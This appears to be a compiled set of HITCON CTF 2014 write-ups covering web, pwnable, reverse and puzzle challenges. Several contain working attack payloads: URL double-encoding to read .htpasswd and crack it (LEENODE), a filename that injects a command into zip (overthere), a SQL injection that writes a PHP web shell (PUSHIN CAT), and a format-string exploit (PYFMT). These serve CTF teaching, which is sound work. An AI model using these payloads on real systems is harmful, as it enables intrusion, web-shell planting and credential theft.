> [https://dl.dropbox.com/s/ucgye5aroyqtswg/girby-86c7d5a294f9b8d67b2dc614ff143b70](girby-86c7d5a294f9b8d67b2dc614ff143b70)

## Write-up

(TODO)

## Other write-ups and resources

* [notes](http://cuby.hu/hitcon-lol-notes-then-not-writeups.txt)
# HITCON CTF 2014: hop

**Category:** Reverse
**Points:** 350
**Description:**

> [https://github.com/hitcon2014ctf/ctf/raw/master/hop/hop-62fa7ade9a1fa9254361e69d70e7a7e3.exe](hop-62fa7ade9a1fa9254361e69d70e7a7e3.exe)
> [https://dl.dropbox.com/s/5l4q7iztyfhc8c1/hop-62fa7ade9a1fa9254361e69d70e7a7e3.exe](hop-62fa7ade9a1fa9254361e69d70e7a7e3.exe)

## Write-up

(TODO)

## Other write-ups and resources

* <http://pastie.org/9482170>
* <http://pastie.org/private/wqfyttp1msepodg4ovx9g>
* <http://pastie.org/private/mpabofsscu6m2dpablxcag>
* <http://www.idabook.com/ctf/hop_writeup.txt>
* <https://rzhou.org/~ricky/hitcon2014/hop/>
# HITCON CTF 2014: LEENODE

**Category:** Web
**Points:** 250
**Description:**

> http://203.66.57.98/

## Write-up

[Source](https://wiki.mma.club.uec.ac.jp/CTF/Writeup/HITCON2014/LEENODE) (Modified only slightly for grammar and Markdown formatting)

1. Perhaps what we need to do is access the `/admin/` directory.
2. The server is Apache/2.0.65 (Unix) JRun/4.0 Server.
3. `*.jsp` was redirected to JRun Server.
*  [http://203.66.57.98/a.jsp](http://203.66.57.98/a.jsp)
4. A vulnerability for JRun exists publicly
* [http://www.kb.cert.org/vuls/id/977440](http://www.kb.cert.org/vuls/id/977440)
5. [http://203.66.57.98/a;.jsp](http://203.66.57.98/a;.jsp) gives a 500 Internal Server Error. Interestingly enough Apache serves up this error, not JRun as expected.
6. Escaping the URL for Apache as such [http://203.66.57.98/a%253b.jsp](http://203.66.57.98/a%253b.jsp) gives a 404 Error by JRun instead of the expected Apache.
7. Apache blocks many attempts to read `/.htaccess` and `/admin/.htaccess` so other tricks are needed.
8. It is discovered that JRun recognizes backslash as a directory separator as [http://203.66.57.98/.%5Ca%253b.jsp](http://203.66.57.98/.%5Ca%253b.jsp) was handled as /a by JRun.
9. Eventually `/admin/.htaccess` and `/admin/.htpasswd` are read using the following URLs respectively
[http://203.66.57.98/.%5Cadmin%5C.htaccess%253b.jsp](http://203.66.57.98/.%5Cadmin%5C.htaccess%253b.jsp)
[http://203.66.57.98/.%5Cadmin%5C.htpasswd%253b.jsp](http://203.66.57.98/.%5Cadmin%5C.htpasswd%253b.jsp)

`.htaccess` reads as follows:

```
AuthName "Restricted Area"
AuthType Basic
AuthUserFile /usr/local/apache2/htdocs/admin/.htpasswd
AuthGroupFile /dev/null
require valid-user
```

`.htpasswd` reads as follows:


```
hitc0n_1een0de:nlGc3XNhkrL1o
```

10. Let’s use John the Ripper to crack the password:

```
% john .htpasswd
ktw2z            (hitc0n_1een0de)
guesses: 1  time: 0:00:01:13 DONE (Sat Aug 16 20:58:25 2014)  c/s: 5319K  trying: ktkcK - kk4iT
```

The password is `ktw2z`.

11. Visit [http://203.66.57.98/admin/thefl4g.txt](http://203.66.57.98/admin/thefl4g.txt) and get the flag

```
The flag is HITCON{u_d0nt_f0rg3t_d0uble_3nc0ding!}
```

## Other write-ups and resources

* [notes](http://cuby.hu/hitcon-lol-notes-then-not-writeups.txt)
# HITCON CTF 2014: maze

**Category:** Game
**Points:** 250
**Description:**

> Capture the flag in the maze!
>
> ```bash
> telnet 210.71.253.213 8473
> ```

**Hint:**

> If you have found the flag but get wrong flag response… read it carefully, or just pm admin.

## Write-up

```bash
$ telnet 210.71.253.213 8473
Trying 210.71.253.213...
Connected to 210-71-253-213.hinet-ip.hinet.net.
Escape character is '^]'.

You have 10 minutes to capture the flag :)
Loading...
```

Once the game has finished loading, it prints:

```
.@..@....
@..@..@..
@....@@.@
@@...@@@@
@..@o....
.@@...@.@
..@.@..@.
@.....@@@
..@@.@.@@
```

The `o` character in the center marks your current location. `@` are walls, and `.` are ‘walkable’ areas. You can move around using the arrow keys.

After mapping the (huge) area completely, it turns out the maze represents [a QR code](qrcode.svg):

![](qrcode.svg)

Decoding this results in an ASCII art version of the flag:

```
.  . , ,---.  ,-.  ,-.  .  . ,-  ,-.   ,-.  .   ,  ,.  ,---, ,--.   ,  ,-.     ,-.  ,-.   ,-.  ,    . -.
|  | |   |   /    /   \ |\ | \  /   \  |  ) |\ /| /  \    /  |      | (   `   /    /   \ /   \ |    |  /
|--| |   |   |    |   | | \| <  |   |  |-<  | V | |--|   /   |-     |  `-.    |    |   | |   | |    |  >
|  | |   |   \    \   / |  | /  \   X  |  \ |   | |  |  /    |      | .   )   \    \   / \   / |       \
'  ' '   '    `-'  `-'  '  ' `-  `-' ` '  ' '   ' '  ' '---' `--'   '  `-'     `-'  `-'   `-'  `--' o -'
```

The flag is `HITCON{QRMAZEISCOOL!}`.

## Other write-ups and resources

* [source](https://github.com/hitcon2014ctf/ctf/tree/master/maze)
# HITCON CTF 2014: mid

**Category:** ACM
**Points:** 250
**Description:**

> Problem A
>
> http://54.64.29.164:32384/

**Hint:**

> gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1)
> gcc -O2 -static source.c
> Read input from stdin and write output to stdout.
> Single test case in each file, but test several times on multiple file.
>
> It's a CTF challange, you may need a interesting trick to solve it.
> Both setrlimit & cgroup is used.
> (memory.limit_in_bytes, memory.swappiness, RLIMIT_AS)
>
> No temp file is allowed. In fact, it's chroot to an read-only empty directory.
> No socket, IPC, so you can't send the test data out.
> Number of process limit to 8.
> All syscall is allowed.
>
> You need to STEAL MORE MEMORY, but how? where?

## Write-up

(TODO)

## Other write-ups and resources

* <http://puu.sh/aXd9p/44f33626e7.txt>
# HITCON CTF 2014: overthere

**Category:** Misc.
**Points:** 179
**Description:**

> ```bash
> nc 210.65.11.5 4994
> ```

## Write-up

```bash
root@kali:~# nc 210.65.11.5 4994

 **      ** ** **********   ******    *******   ****     **   **     **
/**     /**/**/////**///   **////**  **/////** /**/**   /**  //**   **
/**     /**/**    /**     **    //  **     //**/**//**  /**   //** **
/**********/**    /**    /**       /**      /**/** //** /**    //***
/**//////**/**    /**    /**       /**      /**/**  //**/**     **/**
/**     /**/**    /**    //**    **//**     ** /**   //****    ** //**
/**     /**/**    /**     //******  //*******  /**    //***   **   //**
//      // //     //       //////    ///////   //      ///   //     //
                                                            by oldtrick

Welcome to my shell. Just pwn to own.

$
```

Cool, a shell!

```
$ ls -lha
total 120K
drwxrwxrwx    2 2137755712 overthere 4.0K Aug 18 01:01 .
drwx-wx-wx 1270 root       root      108K Aug 18 01:01 ..
-rw-r--r--    1 2137755712 overthere    0 Aug 18 01:01 atdog_said_it's_easy
-rw-r--r--    1 2137755712 overthere   34 Aug 18 01:01 flag

$ help
Command:
	echo, exit, touch, cat, ls
id - return user identity
uname - display information about the system
echo - write arguments to the standard output
touch - change file access and modification times
ls - list directory contents
cat - concatenate and print files
exit - backup your files and exit

$ id
uid=2137755712 gid=1001(overthere)

$ uname
Linux

$ uname -a
Linux ctf 3.13.0-30-generic #54-Ubuntu SMP Mon Jun 9 22:45:01 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

Okay, so a lot of things work. However, there are some problems. For example, you can’t directly `cat` a file:

```bash
$ cat flag
Serious? Are you kidding me?!
$ touch test
$ cat test
Serious? Are you kidding me?!
```

Output redirection doesn’t work the way you’d expect it to:

```bash
$ echo test > test
Invalid character.
```

When we type exit we see the following:

```bash
$ exit

Start zipping file...
  adding: atdog_said_it's_easy (stored 0%)
Done.

Did you forget to catch the flag?

Bye!
```

We can see that at exit the current working directory is passed as arguments to the `zip` command. Using `touch` to create a new file that will be used as commandline arguments to `exit` seems like a viable option. A good thing to do is to leverage the `-T`/`--test` and `-TT` options of the `zip` command which do the following:

```
-T
--test
    Test the integrity of the new zip file. If the check fails, the old zip file is unchanged and (with the -m option) no input files are removed.

-TT cmd
--unzip-command cmd
    Use command cmd instead of 'unzip -tqq' to test an archive when the -T option is used. On Unix, to use a copy of unzip in the current directory instead of the standard system unzip, could use:
    zip archive file1 file2 -T -TT "./unzip -tqq"

    In cmd, {} is replaced by the name of the temporary archive, otherwise the name of the archive is appended to the end of the command. The return code is checked for success (0 on Unix).
```

With this we see that we can force the zip archive to be tested and even provide the command to test with. The hard part about this attack is that we need to be able to create a file with the filname of commandline arguments which would normally be processed by `touch` and cause an error as they are not legitimate arguments to the `touch` command. We can remedy this by using the `--` argument which reads in our filename from STDIN instead of literally from the commandline.

Leveraging this information we come up with the following command which allows us to bypass the restriction of running cat directly as well as all other restrictions.

```bash
touch -- -T -TTcat\ flag
```

We run that command and then run `exit` and get the following

```bash
root@kali:~# nc 210.65.11.5 4994

 **      ** ** **********   ******    *******   ****     **   **     **
/**     /**/**/////**///   **////**  **/////** /**/**   /**  //**   **
/**     /**/**    /**     **    //  **     //**/**//**  /**   //** **
/**********/**    /**    /**       /**      /**/** //** /**    //***
/**//////**/**    /**    /**       /**      /**/**  //**/**     **/**
/**     /**/**    /**    //**    **//**     ** /**   //****    ** //**
/**     /**/**    /**     //******  //*******  /**    //***   **   //**
//      // //     //       //////    ///////   //      ///   //     //
                                                            by oldtrick

Welcome to my shell. Just pwn to own.
$ touch -- -T -TTcat\ flag
$ exit

Start zipping file...
  adding: atdog_said_it's_easy (stored 0%)
HITCON{0ld_7rick5_alw4y5_workS!!}
PK
ocEatdog_said_it's_easyUT	���S���Sux
                                          �Z��PK
ocE��atdog_said_it's_easyUT���Sux
                                 �Z��PKZNtest of takeaway.zip OK
Done.

Did you forget to catch the flag?

Bye!
```

The flag is
> `HITCON{0ld\_7rick5\_alw4y5\_workS!!}`.

## Other write-ups and resources

* <http://givemesecurity.info/2014/08/18/overthere-writeup-hitcon-2014/>
* [Unix Wildcards Gone Wild](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
* <https://gist.github.com/anthraxx/fe4984780a9f284dee08>
* <https://rzhou.org/~ricky/hitcon2014/overthere/>
# HITCON CTF 2014: Pneumotoulthamicrescopicfilicoloaganiconissis

**Category:** Trivia
**Points:** 80
**Description:**

> [https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/Pneumotoulthamicrescopicfilicoloaganiconissis-df5bb3d8f83d6d37e16560062cb231bc.txt](Pneumotoulthamicrescopicfilicoloaganiconissis-df5bb3d8f83d6d37e16560062cb231bc.txt)
> [https://dl.dropbox.com/s/c90ozt18mxmriko/Pneumotoulthamicrescopicfilicoloaganiconissis-df5bb3d8f83d6d37e16560062cb231bc.txt](Pneumotoulthamicrescopicfilicoloaganiconissis-df5bb3d8f83d6d37e16560062cb231bc.txt)

**Hint:**

> diff the file content and the origin english word (try to find it out)

## Write-up

By searching for the string (just part of it) in the google we find out that it's the [http://en.wikipedia.org/wiki/Longest_word_in_English](longest word) that contains 189 819 characters and apparenty (by reading the hint) it was modified. We need to obtain the original one. Some more Googling reveals the word in its full form: <http://www.digitalspy.co.uk/fun/news/a444700/longest-word-has-189819-letters-takes-three-hours-to-pronounce.html>.

Now that we have the original, we can write a short Python script:

```python
longest = '' # put the longest word here
longest_modified = '' # put the modified longest word here
i = 0
password = ''
plLen = len(longest_modified)

for j in range(0, plLen):
  c = longest_modified[j]
  d = longest[i]
  if c != d:
    password = password + c
  i = i + 1
  j = j + 1

print password
```

Running the script produces:

```
HITCON{This flag is longestestestestestestestestestestestestestestestestestestestestestestestestestest!!!}
```

…which is the flag.

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-hitcon-pneumo/>
* <https://rzhou.org/~ricky/hitcon2014/pneumotoulthamicrescopicfilicoloaganiconissis/>
# HITCON CTF 2014: polyglot

**Category:** Crazy
**Points:** 500
**Description:**

> Just `cat flag`
> http://210.61.2.47:8192/

**Hint:**

> Similar to DEFCON 22 quals polyglot, but ...
>
> Judge command:
>
> ```bash
> /usr/bin/python2.7 temp.py 2>/dev/null
> /usr/bin/python3.4 temp.py 2>/dev/null
> /usr/bin/gcc temp.c -o tempexe 2>/dev/null && tempexe 2>/dev/null
> /usr/bin/ruby temp.rb 2>/dev/null
> /usr/bin/runhaskell temp.hs 2>/dev/null
> ```

## Write-up

<https://gist.github.com/pyrocat101/c1c300c4d806513c1a56>

We start from Python2/3:

```python
import os
os.system("cat flag");
```

To make `gcc` happy, we need some polyglot syntax to comment out the `import` statement in C. Recall that C has compiler directives that start with `#`, which is also a line comment in Python. Conditional compilation seems to be an ideal choice because it also acts as a block comment in C. Then we can define a macro for `main` so that the result is valid in Python and in C.

```c
#if 0
import os
p = os.system
#endif
#define p(s) main(){system(s);}
p("cat flag");
```

Ruby seems more complicated at first sight, because it’s harder to only comment out either one of Ruby and Python. But remember that Python has docstring `"""..."""`, whereas Ruby has syntax like `""""` that evaluates to a single `""`. Leveraging this, we can comment out Ruby code in Python program. Oh, also remember that `__END__` terminates Ruby interpretation. This syntax comes handy because later on we don’t need to care about Ruby anymore. After some more tinkering, we get a program like this:

```ruby
#if 0
""""
print `cat flag`
__END__
"""
import os
p = os.system
#endif
#define p(s) main(){system(s);}
p("cat flag");
```

The hardest part is adding support for Haskell. Haskell has a rigid syntax that makes it hard to construct our polyglot. Intuition tells us that code in all other languages should be wrapped into a Haskell block comment like this:

```haskell
{-
...
-}main = do x <- readFile "flag"; putStr x
```

Unfortunately that won’t work because it is illegal in all other languages. To make it play nice with C, we can write something like `x = {-0}; //-}` and despite `gcc`’s warning it is an array literal. To make it a legal Python program we further extend it to be `x = {-0}; ... #define x //-}`, and it is interpreted as a set literal in Python. Ruby does not have set literal, but it has hash syntax `{key => value}`. Since all other languages does not recognize hash rocket token `=>`, we use the old Python docstring trick to make the program roughly look like: `x = {-0 + """".to_i => 0} ... __END__ """.find('x')} ... #define x //-} ...`. Finally we get a working polyglot that looks like this:

```
x = {-
#if 0
0 + """".to_i => 0}
print `cat flag`
__END__
""".find('x')}
import os
p = os.system;{
#endif
1};
#define p(s) main(){system(s);}
p("cat flag");
#define x // -}();main = do x <- readFile "flag"; putStr x
```

Showing the same code with syntax highlighting for each programming language clearly shows what gets executed:

**Python:**

```python
x = {-
#if 0
0 + """".to_i => 0}
print `cat flag`
__END__
""".find('x')}
import os
p = os.system;{
#endif
1};
#define p(s) main(){system(s);}
p("cat flag");
#define x // -}();main = do x <- readFile "flag"; putStr x
```

**Ruby:**

```ruby
x = {-
#if 0
0 + """".to_i => 0}
print `cat flag`
__END__
""".find('x')}
import os
p = os.system;{
#endif
1};
#define p(s) main(){system(s);}
p("cat flag");
#define x // -}();main = do x <- readFile "flag"; putStr x
```

**C:**

```c
x = {-
#if 0
0 + """".to_i => 0}
print `cat flag`
__END__
""".find('x')}
import os
p = os.system;{
#endif
1};
#define p(s) main(){system(s);}
p("cat flag");
#define x // -}();main = do x <- readFile "flag"; putStr x
```

**Haskell:**

```haskell
x = {-
#if 0
0 + """".to_i => 0}
print `cat flag`
__END__
""".find('x')}
import os
p = os.system;{
#endif
1};
#define p(s) main(){system(s);}
p("cat flag");
#define x // -}();main = do x <- readFile "flag"; putStr x
```

## Other write-ups and resources

* <http://tasteless.eu/2014/08/hitcon2014-polyglot-crazy500/>
* <http://www.hxp.io/blog/7/HITCON+CTF+2014%3A+crazy500+%22polyglot%22>
* <http://v0ids3curity.blogspot.in/2014/08/hitcon-ctf-2014-polyglot-crazy-500.html>
* <https://rzhou.org/~ricky/hitcon2014/polyglot/>
# HITCON CTF 2014: PUSHIN CAT

**Category:** Web
**Points:** 350
**Description:**

> http://203.66.14.60/

**Hint:**

> The flag is file based. Try to get shell :P

## Write-up

Basically PUSHIN CAT offers only three functionalities: login, registration and the deceptive [“Get flag”](http://203.66.14.60/flag.html). The last one tells us “You are not admin from `X`”, where `X` is our IP address.

The displayed IP address quickly leads down a wrong route because trying to forge a local IP address (e.g. 127.0.0.1) with HTTP headers does not work. However, the registration page seems to be vulnerable to a very basic SQL injection vulnerability, as it responds with a “Query Error” to a single quote in the password field (the detail of the error message seems to have increased since we solved the challenge, so now you even get the surrounding query). Even without seeing the query, one can easily guess that it must be an `INSERT` into the database. After fiddling around with the injection, the format of the SQL query seems to be this one:

```sql
INSERT INTO [something...] VALUES ([some fields], 'INJECTION IN PW', 'IP')
```

This is great news, since the IP value is shown to us when clicking the “Get flag” button. We can further try to obtain the amount of parameters in the query with a multi-INSERT technique: `foo','IP'),(1,2)-- -`. This will insert 2 records into the database. We can continously increase the amount of parameters in the second query until there is no error anymore. This is the case with 4 parameters: `foo','IP'),(1,2,3,4)-- -`.

In order to dump the database schema and content, we can make use of subqueries: The injection syntax is `foo',(select 1))-- -`, where 1 could be any query returning only one row. Additionally, we can use `group\_concat` to group multiple rows together and read out `information_schema.tables` and `information_schema.columns`. From there on we can easily see that the original query roughly looks like this:

```sql
INSERT INTO users (role, username, password, ip) VALUES ('user', $username, $pw (INJECTION HERE), $ip)
```

Using this knowledge, we can build a multi-INSERT injection to create a user with the role “admin”. Logging in with that user and clicking “Get flag” only yields the message “Give shell plz” (IIRC). Another dead end.

A test confirms another interesting property: Multiple SQL statements are allowed in the injection (which is only the case with very few database drivers), so we can use `;` to add other kinds of queries. But let's first re-check the database engine to know our possibilities: The injection `foo',(select version()))-- -` yields `PostgreSQL 8.1.4  server protocol using H2 1.4.178 (2014-05-02)`. Okay, so… Postgres? However, what is this H2 thingy? As it turns out it is the underlying database engine. In order to exploit the server, we can make use of [all functions](http://www.h2database.com/html/functions.html) this database engine exposes. One of them, called `CSVWRITE`, seems to be particularly useful to drop files in the web root. The injection would look like this:

```
foo','');CALL CSVWRITE('/var/www/html/shell.php', 'SELECT 1')-- -
```

As can be seen from the syntax, the second parameter to `CSVWRITE` is a query. This example would write a file called `shell.php` in the web root (we guessed that but could also easily check the Apache configuration with file reading functions). However, the file would only contain a `1`. In order to avoid escaping our own quotes, we can use the `CHR(decimal)` function and the concatenation operator. Here is the resulting injection, using all the tricks:

```
foo','');CALL CSVWRITE('/var/www/html/shell.php', 'SELECT CHR(60)||CHR(63)||CHR(112)||CHR(104)||CHR(112)||CHR(32)||CHR(115)||CHR(121)||CHR(115)||CHR(116)||CHR(101)||CHR(109)||CHR(40)||CHR(36)||CHR(95)||CHR(71)||CHR(69)||CHR(84)||CHR(91)||CHR(48)||CHR(93)||CHR(41)||CHR(59)||CHR(32)||CHR(63)||CHR(62)')-- -
```

In conclusion, a lot of the difficulity of this challenge came from the multiple dead ends and small steps involved. We certainly tried a billion other attacks before finding this exact route to exploit the web application, but we had a lot of fun while doing it ;-)

## Other write-ups and resources

* <https://rzhou.org/~ricky/hitcon2014/pushin_cat/>
# HITCON CTF 2014: puzzle

**Category:** Puzzle
**Points:** 150
**Description:**

> [https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/puzzle-81c5e9bdb219efbe4eb9b194fb33f7e6.jpg](puzzle-81c5e9bdb219efbe4eb9b194fb33f7e6.jpg)
> [https://dl.dropbox.com/s/wh0uset031ivgsq/puzzle-81c5e9bdb219efbe4eb9b194fb33f7e6.jpg](puzzle-81c5e9bdb219efbe4eb9b194fb33f7e6.jpg)

**Hint:**

> If you have found the flag but it contains characters hard to recognize, pm admin and get correct flag.
>
> Q: Hey I can see "HITCON{" prefix, is that enough?
> A: No, you can and have to extract more.
>
> Flag Format: `HITCON{lllluuul_luul_udd}`
> lowercase / uppercase / digit

## Write-up

Let’s start this challenge by taking a closer look to the image in a hex editor. There are a few things that should get your attention.

* There are two image headers: a JFIF and an EXIF header
* There are multiple JFXX thumbnails

If we take the EXIF data from the image and put that in a new one we get [the following image](ExifImage.jpg). So there must be something hidden in the first part of the image. Since there are multiple thumbnails and the title of the challenge is puzzle I figured we had to extract those thumbnails. A little bit [research on JPEG headers](http://blog.bfitz.us/?p=289) was useful. This enabled me to write [a script for extracting the thumbnails](puzzlesolver.py). This script extracts and creates 100 images.

The second stage of the challenge is literally a puzzle. You got 100 images and you have to puzzle them together. I also wrote [a script to puzzle them together](puzzlesolver_part2.py) however this script does not bruteforce the solution, since there are 5050 different possibilities and I didn’t want to end up with 5050 images in my folder.

```py
# put all the images in the new image
def solve_im(new_im, arr):
    for i in range(100):
        name = str(i+1) + ".jpg"
        im = Image.open(name)
        new_im.paste(im, ((arr.index(i)%10)*128,arr.index(i)/10*96))
```

As you can see you can give an array as argument to the function and it places the images accordingly.

After puzzling the real image together we can see a piece of the flag. Now it is a matter of manipulating the image untill you see the full flag. I used photoshop and the calculations function. After manipulating for a while and using the hint `HITCON{lllluuul_luul_udd}` where `l` is lowercase and `u` is uppercase I came to the following flag: `HITCON{mounTAIn_jPEg_I01}`.

## Other write-ups and resources

* <http://blog.squareroots.de/en/2014/08/hitcon-ctf-2014-puzzle/>
# HITCON CTF 2014: PY4H4SHER

**Category:** Web
**Points:** 200
**Description:**

> http://203.66.14.43/cgi-bin/py4h4sher

## Write-up

Clicking the “source” link reveals the following Python script:

```py
#!/usr/bin/python
# coding: utf-8

import os
import re
import sys
import cgi
import hashlib
from urllib import unquote
from passlib.utils.pbkdf2 import pbkdf2

###

sys.path.append('/home/orange/secret_file')
from secret_file import SECRET # 160 bytes secret
from secret_file import FLAG

###

print 'Content-Type: text/html\n\n'

###

def _pbkdf2(text):
    return pbkdf2(text, 'noggnogg', 1337).encode('hex').lower()

def _md5(text):
    return hashlib.md5( text ).hexdigest().lower()

def getenv(name):
    return unquote( os.environ.get(name) ) or ''

def gotoFail():
    print 'goto fail'
    print
    exit()

def m_hash(password):
    nr = int( 'P0W5'.encode('hex'), 16 )
    add = 7
    nr2 = 305419889

    for c in (ord(x) for x in password if x not in (' ', '\t')):
        nr^= (((nr & 63)+add)*c)+ (nr << 8) & 0xFFFFFFFF
        nr2= (nr2 + ((nr2 << 8) ^ nr)) & 0xFFFFFFFF
        add= (add + c) & 0xFFFFFFFF

    return "%08x%08x" % (nr & 0x7FFFFFFF,nr2 & 0x7FFFFFFF)
###

request = cgi.FieldStorage()

checksum  = request.getvalue('checksum') or ''
query_str = getenv('QUERY_STRING')
if _md5( SECRET + query_str ) == checksum:
    mode = request.getvalue('mode') or ''

    if mode == 'download':
        filename = request.getvalue('filename') or ''
        filename = os.path.basename( filename )
        try:
            print open(filename).read()
        except IOError as e:
            print 'No such file or directory'
    elif mode == 'eval':
        bad_string = request.getvalue('filename') or ''
        good_string = bad_string.encode('hex')
        eval(good_string)

    else:
        stage1 = request.getvalue('stage1') or ''
        if m_hash(stage1) != '4141414141414141':
            gotoFail()

        ###

        plaintext = getenv('HTTP_USER_AGENT')
        stage2 = request.getvalue('stage2') or ''
        if stage2 == plaintext:
            gotoFail()

        if _pbkdf2(plaintext) != _pbkdf2(stage2):
            gotoFail()

        ###

        stage3 = request.getvalue('stage3') or ''
        stage3 = stage3[0]+stage3[1]+stage3[3]+stage3[5]
        if _md5( stage3 ) != '90954349a0e42d8e4426a4672bde16b9':
            gotoFail()

        ###

        print 'Congrat! The flag is',
        print 'HITCON{%s}' % FLAG

else:
    checksum = _md5( SECRET + 'filename=py4h4sher&mode=download' )
    print """
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv='Content-Type' content='text/html; charset=utf-8'>
  <meta name="author" content="orange@chroot.org">
  <title> PY4H4SHER </title>
  <link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css">

  <style>
/*
Inspired by http://dribbble.com/shots/890759-Ui-Kit-Metro/attachments/97174
*/
.out {
    white-space: -moz-pre-wrap;
    white-space: -pre-wrap;
    white-space: -o-pre-wrap;
    white-space: pre-wrap;
    word-wrap: break-word; /* Internet Explorer 5.5+ */
    background-color: white;
    border: 0px;
}

.nav-row {
  text-align: center;
}
.nav-row p {
  padding: 5px;
}
.nav-row .col-md-2 {
  background-color: #fff;
  border: 1px solid #e0e1db;
  border-right: none;
}
.nav-row .col-md-2:last-child {
  border: 1px solid #e0e1db;
}
.nav-row .col-md-2:first-child {
  border-radius: 5px 0 0 5px;
}
.nav-row .col-md-2:last-child {
  border-radius: 0 5px 5px 0;
}
.nav-row .col-md-2:hover {
  color: #e92d00;
  cursor: pointer;
}
.nav-row .glyphicon {
  padding-top: 15px;
  font-size: 40px;
}

  </style>
   <script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
</head>
<body>
<script>
  var script_name = '/cgi-bin/py4h4sher';

  function gohome(){
    window.open( 'http://hitcon.org' );
  }
  function getflag(){
      $.get( script_name ,
              function(data){
                  $('.out').text('nothing to do :(');
              });
  }
  function getsource(){
      $.post( script_name + '?filename=py4h4sher&mode=download',
              {'checksum': '%s'},
              function(data){
                  $('.out').text(data);
              });
  }
</script>

<div class="container" style="margin-top:160px;">
    <div class="row nav-row">
      <div class="col-md-3">
      </div>
      <div class="col-md-2" onclick='gohome()'>
        <span class="glyphicon glyphicon-home"></span>
        <p> Go Home </p>
      </div>
      <div class="col-md-2" onclick='getflag()'>
        <span class="glyphicon glyphicon-flag"></span>
        <p> Get Flag </p>
      </div>
      <div class="col-md-2" onclick='getsource()'>
        <span class="glyphicon glyphicon-cloud-download"></span>
        <p> Get Source </p>
      </div>
    </div>

    <div class='row nav-row'>
      <pre class='out' style='padding-top:64px; '>
      </pre>
    </div>
</div>

</body>
</html>
""" % checksum
```

(TODO)

As demonstrated in [___PBKDF2+HMAC hash collisions explained___](https://mathiasbynens.be/notes/pbkdf2-hmac), the following holds true:

```
PBKDF2_HMAC_SHA1(chosen_password) == PBKDF2_HMAC_SHA1(HEX_TO_STRING(SHA1(chosen_password)))
```

Accordingly, we can choose any `chosen_password` value for the `User-Agent` HTTP header, and predict the `stage2` URL parameter value based on that, to pass the stage 2 protection. [The linked article](https://mathiasbynens.be/notes/pbkdf2-hmac) lists several pre-calculated collisions, and it includes a brute-force script to create your own. Let’s use one of the pre-calculated ones because we’re lazy.

(TODO)

The final solution is:

```bash
$ curl --user-agent 'chosen-prefix_hash_collisions_ftw_aaaaaaaaaaaaaaaaaaaaaaaafikpjor' --data 'checksum=af247ce6e8c70768eae27ec6feae34f6&mode=foo&stage1=*WqX%25n%7E%22%228DpVv&stage2=%7CBHwN%40zatb0TT%3A5I3%7C7%3C&stage3=e&stage3=n&stage3=x&stage3=i&stage3=x&stage3=gma' 'http://203.66.14.43/cgi-bin/py4h4sher?filename=py4h4sher&mode=download'

Congrat! The flag is HITCON{th1s_1s_bas1c_cha11enge_f0r_p3nt3st3r!}
```

And indeed, the flag is `HITCON{th1s_1s_bas1c_cha11enge_f0r_p3nt3st3r!}`.

## Other write-ups and resources

* [PBKDF2+HMAC hash collisions explained](https://mathiasbynens.be/notes/pbkdf2-hmac)
# HITCON CTF 2014: PYCMD

**Category:** Pwnable
**Points:** 250
**Description:**

> ```
> cmd.exe (/noexecute:alwaysoff)
> pwn 54.64.1.14 8361
> ```

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# HITCON CTF 2014: PYFMT

**Category:** Pwnable
**Points:** 152
**Description:**

> pwn 54.92.19.227 8212

**Hint:**

> [https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/pyfmt_easy-9da3aa531c4f9c5e8a11dfd0459b11e2.tar.gz](pyfmt_easy-9da3aa531c4f9c5e8a11dfd0459b11e2.tar.gz)
> [https://dl.dropbox.com/s/wd6qeifygvf2lmh/pyfmt_easy-9da3aa531c4f9c5e8a11dfd0459b11e2.tar.gz](pyfmt_easy-9da3aa531c4f9c5e8a11dfd0459b11e2.tar.gz)
>
> easy ver 2
> [https://dl.dropbox.com/s/kq7klsrw7wzk3qn/pyfmt_easy-e13e6f82378751f7e909e4ae18676aa3.tar.gz](pyfmt_easy-e13e6f82378751f7e909e4ae18676aa3.tar.gz)

## Write-up

(TODO)

```bash
$ nc 54.92.19.227 8212
hello world!
who are U?
%104$1129p %104$hn
hi!                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  0x6b8254
bye!
Python 2.7.5 (default, Feb 11 2014, 07:46:25)
[GCC 4.8.2 20140120 (Red Hat 4.8.2-13)] on linux2
Type "help", "copyright", "credits" or "license" for more information.
(InteractiveConsole)
>>> import os; os.system('ls');
bin
boot
data
dev
etc
home
key_this.txt
lib
lib64
log
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
0
>>> os.system('cat key_this.txt');
HITCON{e80c1f7f81b3d1b0514d2aa24e0eeecb}
0
>>>
```

The flag is `HITCON{e80c1f7f81b3d1b0514d2aa24e0eeecb}`.

## Other write-ups and resources

* none yet
# HITCON CTF 2014

* [Main website](http://ctf2014.hitcon.org/dashboard)
* [Scoreboard](http://ctf2014.hitcon.org/scoreboard) or [local alternative](scoreboard.txt)
* [HITCON CTF 2014 @ CTFtime.org](https://ctftime.org/event/148)

## Completed write-ups

* [24](24)
* [DIAGCGI](diagcgi)
* [EASYINJ](easyinj)
* [finger](finger)
* [ginger](ginger)
* [LEENODE](leenode)
* [maze](maze)
* [overthere](overthere)
* [Pneumotoulthamicrescopicfilicoloaganiconissis](pneumotoulthamicrescopicfilicoloaganiconissis)
* [polyglot](polyglot)
* [PUSHIN CAT](pushin-cat)
* [puzzle](puzzle)
* [rsaha](rsaha)
* [Tarmful](tarmful)

## External write-ups only

* [badger](badger)
* [callme](callme)
* [ducky](ducky)
* [G8LA](g8la)
* [girby](girby)
* [hop](hop)
* [mid](mid)
* [PY4H4SHER](py4h4sher)
* [rsbo](rsbo)
* [sha1lcode](sha1lcode)
* [stkof](stkof)
* [ty](ty)
* [wtf6](wtf6)

## Missing write-ups

* [breath](breath)
* [de](de)
* [pycmd](pycmd)
* [PYFMT](pyfmt)
* [vash](vash)
